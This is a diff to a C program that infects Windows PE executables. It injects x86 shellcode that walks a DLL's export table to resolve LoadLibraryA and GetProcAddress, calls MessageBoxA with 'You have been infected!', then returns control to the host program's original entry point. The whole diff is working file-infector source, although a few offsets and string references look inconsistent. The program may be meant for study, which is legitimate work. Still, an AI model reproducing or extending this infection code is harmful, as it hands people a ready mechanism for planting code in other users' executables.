@@ -19,7 +19,7 @@ int main(int argc, char *argv[]) {
     const char *data[] = {
         "Notice",
         "You have been infected!",
-        "LoadLibrary",
+        "LoadLibraryA",
         "GetProcAddress",
         "user32.dll",
         "MessageBoxA",
@@ -83,8 +83,8 @@ int main(int argc, char *argv[]) {
     // Import Address Table (IAT)
     imageOptionalHeader.DataDirectory[12].VirtualAddress = getval(fr, dd, SEEK_SET,
                                                                   ioh_offset + (imageOptionalHeader.Magic == 0x10B
-                                                                      ? 192
-                                                                      : 208)); // iat_rva
+                                                                          ? 192
+                                                                          : 208)); // iat_rva
     imageOptionalHeader.DataDirectory[12].Size = getval(fr, dd, SEEK_SET,
                                                         ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 196 : 212));
 
@@ -275,23 +275,23 @@ int main(int argc, char *argv[]) {
     write_instruction(fa, 0x01df);
     // mov [ebp-0Ch], edi
     instruct(fa, 0x897d, -12,db);
-    // mov edx, [eax + 1Ch] 						// RVA of Address Table
-    instruct(fa, 0x8b50, 0x1c,db);
+    // mov edx, [eax + 1Ch]
+    instruct(fa, 0x8b50, 0x1c,db); // RVA of Address Table
     // add edx, ebx
     write_instruction(fa, 0x01da);
     // mov [ebp-10h], edx
     instruct(fa, 0x8955, -16, db);
-    // mov edx, [eax + 14h] 						// Number of exported functions
-    instruct(fa, 0x8b50, 0x14,db);
-
-    // Find LoadLibrary
+    // mov edx, [eax + 14h]
+    instruct(fa, 0x8b50, 0x14,db); // Number of exported functions
     // xor eax, eax
     write_instruction(fa, 0x31c0);
-    int loopback = ftell(fa);
+
+    // Find LoadLibrary
+    int lla_loopback = ftell(fa);
     // mov edi, [ebp-0xC]
     instruct(fa, 0x8b7d, -12, db);
     // mov esi, data[4]
-    instruct(fa, 0xbf,
+    instruct(fa, 0xbe,
              imageOptionalHeader.ImageBase + newish.VirtualAddress + data[4] - data[0], dd);
     // xor ecx, ecx
     write_instruction(fa, 0x31c9);
@@ -305,21 +305,120 @@ int main(int argc, char *argv[]) {
     instruct(fa, 0x6683c1, data[2] - data[2 - 1], db);
     // repe cmpsb
     write_instruction(fa, 0xf3a6);
+    // jz found
+    int lla_jz_found = ftell(fa);
+    instruct(fa, 0x0f84, 0,dd); // Placeholder value to be edited later
 
-    // Call MessageBoxA
+    // inc eax
+    write_instruction(fa, 0x40);
+    // cmp eax,edx
+    write_instruction(fa, 0x39d0);
+    // jb loopback
+    instruct(fa, 0x0f82, lla_loopback - ftell(fa) + 2 + dd, dd);
+
+    // add esp, ??h
+    // Reinstate the stack
+    // jmp entry
+    write_instruction(fa, 0xe9); // Not found, go to entry point, filled later
+    pad(fa, 4);
+    int lla_jmp_entry = ftell(fa); // Save address to be edited later
+
+    // Found LoadLibraryA, eax hold address
+    setval_int(fr, ftell(fa) - lla_jz_found, dd, SEEK_SET, lla_jz_found - dd);
+    // mov ecx, [ebp-8] ; Addr of OrdinalTbl to ecx
+    instruct(fa, 0x8b4d, -8, db);
+    // mov edx, [ebp-10h] ; Addr of AddrTbl to edx
+    instruct(fa, 0x8b55, -16, db);
+    // mov ax, [ecx + eax*2]
+    write_instruction(fa, 0x668b0441);
+    // mov eax, [edx + eax*4]
+    write_instruction(fa, 0x8b0482);
+    // add eax, ebx
+    write_instruction(fa, 0x01d8); // eax holds mem addr of LoadLibraryA
+    // push data[4] (user32.dll)
+    instruct(fa, 0x68,
+             imageOptionalHeader.ImageBase + newish.VirtualAddress + data[4] - data[0], dd);
+    // call eax
+    write_instruction(fa, 0xffd0);
+    // mov [ebp - 0x14], eax
+    instruct(fa, 0x8945, -20, db);
+
+    // Find GetProcAddress
+    int gpa_loopback = ftell(fa);
+    // xor eax, eax
+    write_instruction(fa, 0x31c0);
+    // mov edi, [ebp-0xC]
+    instruct(fa, 0x8b7d, -12, db);
+    // mov esi, data[3]
+    instruct(fa, 0xbe,
+             imageOptionalHeader.ImageBase + newish.VirtualAddress + data[3] - data[0], dd);
+    // xor ecx, ecx
+    write_instruction(fa, 0x31c9);
+    // cld
+    write_instruction(fa, 0xfc);
+    // mov edi, [edi + eax*4]
+    write_instruction(fa, 0x8b3c87);
+    // add edi, ebx;
+    write_instruction(fa, 0x01df);
+    // add cx, strlen(data[3])
+    instruct(fa, 0x6683c1, data[3] - data[3 - 1], db);
+    // repe cmpsb
+    write_instruction(fa, 0xf3a6);
+    // jz found
+    int gpa_jz_found = ftell(fa);
+    instruct(fa, 0x0f84, 0,dd); // Placeholder value to be edited later
+
+    // inc eax
+    write_instruction(fa, 0x40);
+    // cmp eax,edx
+    write_instruction(fa, 0x39d0);
+    // jb loopback
+    instruct(fa, 0x0f82, gpa_loopback - ftell(fa) + 2 + dd, dd);
+
+    // add esp, ??h
+    // Reinstate the stack
+    // jmp entry
+    write_instruction(fa, 0xe9); // Not found, go to entry point, filled later
+    pad(fa, 4);
+    int gpa_jmp_entry = ftell(fa); // Save address to be edited later
+
+    // Found GetProcAddress, eax hold address
+    setval_int(fr, ftell(fa) - gpa_jz_found, dd, SEEK_SET, gpa_jz_found - dd);
+    // mov ecx, [ebp-8] ; Addr of OrdinalTbl to ecx
+    instruct(fa, 0x8b4d, -8, db);
+    // mov edx, [ebp-10h] ; Addr of AddrTbl to edx
+    instruct(fa, 0x8b55, -16, db);
+    // mov ax, [ecx + eax*2]
+    write_instruction(fa, 0x668b0441);
+    // mov eax, [edx + eax*4]
+    write_instruction(fa, 0x8b0482);
+    // add eax, ebx
+    write_instruction(fa, 0x01d8); // eax holds mem addr of GetProcAddress
+    // push data[5] (MessageBoxA)
+    instruct(fa, 0x68,
+             imageOptionalHeader.ImageBase + newish.VirtualAddress + data[5] - data[0], dd);
+    // push [ebp - 0x18]
+    instruct(fa, 0xff75, -24, db);
+    // call eax
+    write_instruction(fa, 0xffd0);
+
+    // Invoke MessageBoxA
     // push 1030h (Type)
-    instruct(fa, 0x68, 0x1030, dd);
-    // push data[0]
+    instruct(fa, 0x68, MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL, dd);
+    // push data[0] (Notice)
     instruct(fa, 0x68, imageOptionalHeader.ImageBase + newish.VirtualAddress, dd);
-    // push data[1]
+    // push data[1] (You have been infected!)
     instruct(fa, 0x68,
              imageOptionalHeader.ImageBase + newish.VirtualAddress + data[1] - data[0], dd);
     // push 0 (hWnd)
     instruct(fa, 0x6a, 0, db);
-    // call MessageBoxA
-    instruct(fa, 0xFF15, imageOptionalHeader.ImageBase + msgbox_iat_rva, dd);
+    // call eax (MessageBoxA)
+    write_instruction(fa, 0xFFD0);
 
-
+    // Fill in value at jmp entry LoadLibraryA
+    setval_int(fr, ftell(fa) - lla_jmp_entry, dd, SEEK_SET, lla_jmp_entry - dd);
+    // Fill in value at jmp entry GetProcAddress
+    setval_int(fr, ftell(fa) - gpa_jmp_entry, dd, SEEK_SET, gpa_jmp_entry - dd);
     // jmp back to old AddressOfEntryPoint
     instruct(fa, 0xFF25, imageOptionalHeader.ImageBase + old_entry, dd);
 
